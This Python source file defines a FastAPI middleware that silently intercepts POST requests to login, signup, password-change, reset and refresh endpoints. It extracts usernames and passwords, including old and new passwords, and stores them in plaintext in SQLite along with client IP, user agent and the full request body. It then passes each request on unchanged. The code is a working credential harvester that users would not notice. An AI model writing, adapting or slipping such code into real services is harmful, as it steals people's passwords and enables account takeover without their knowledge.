#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
from typing import Dict, Any

from fastapi import Request, Response
from starlette.middleware.base import BaseHTTPMiddleware

from db_capture import save_capture, init_db

# Инициализация БД
init_db()

class CaptureMiddleware(BaseHTTPMiddleware):
    """Перехватывает POST-запросы к /auth/* и сохраняет в SQLite."""

    TARGET_PATHS = {
        '/auth/login',
        '/auth/signup',
        '/auth/register',
        '/auth/change-password',
        '/auth/reset-password',
        '/auth/refresh',
    }

    EMAIL_FIELDS = {'email', 'username', 'login', 'user', 'mail'}
    PASSWORD_FIELDS = {'password', 'passwd', 'pwd', 'old_password', 'new_password', 'confirm_password'}

    async def dispatch(self, request: Request, call_next) -> Response:
        # Проверяем только POST-запросы к целевым эндпоинтам
        if request.method == "POST" and request.url.path in self.TARGET_PATHS:
            body = await request.body()
            data = {}

            # Пробуем парсить JSON
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                # Пробуем парсить form-data
                try:
                    form_data = await request.form()
                    data = dict(form_data)
                except:
                    pass

            if data:
                self._process(request, data)

            # Восстанавливаем тело
            async def receive():
                return {"type": "http.request", "body": body}
            request._receive = receive

        response = await call_next(request)
        return response

    def _process(self, request: Request, data: Dict[str, Any]) -> None:
        """Извлекает email и пароль, сохраняет в БД."""
        email = None
        for field in self.EMAIL_FIELDS:
            if field in data and data[field]:
                email = data[field]
                break

        password = None
        for field in self.PASSWORD_FIELDS:
            if field in data and data[field]:
                password = data[field]
                break

        if email or password:
            capture_data = {
                'email': email or 'не указан',
                'password': password or 'не указан',
                'ip': request.client.host if request.client else 'unknown',
                'path': request.url.path,
                'user_agent': request.headers.get('user-agent', 'unknown'),
                'full_data': data,
            }

            save_capture(capture_data)